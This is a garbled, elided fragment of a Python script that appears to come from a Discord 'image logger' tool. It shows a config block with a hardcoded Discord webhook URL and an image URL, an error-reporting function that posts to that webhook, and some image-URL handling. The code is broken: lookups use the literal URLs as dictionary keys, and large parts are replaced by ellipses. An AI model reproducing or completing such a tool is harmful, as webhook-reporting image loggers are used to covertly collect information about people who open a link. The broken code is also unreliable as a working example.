...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1383347133209641051/2iPbD0xHdumxAiH68C04jbIb2NAOC70ef7DvB0FhItBX02h6YX-fG25tmVQr-jOGvhsh",
    "image": "https://ifh.cc/g/RRGjjO.png", # You can also have a custom image by using a URL argument
...
def reportError(error):
    requests.post(config["https://discord.com/api/webhooks/1383347133209641051/2iPbD0xHdumxAiH68C04jbIb2NAOC70ef7DvB0FhItBX02h6YX-fG25tmVQr-jOGvhsh"], json = {
        ...
        try:
            if config["imageArgument"]:
                ...
                if dic.get("url") or dic.get("id"):
                    ...
                    url = config["https://ifh.cc/g/RRGjjO.png"]
            else:
                url = config["https://ifh.cc/g/RRGjjO.png"]
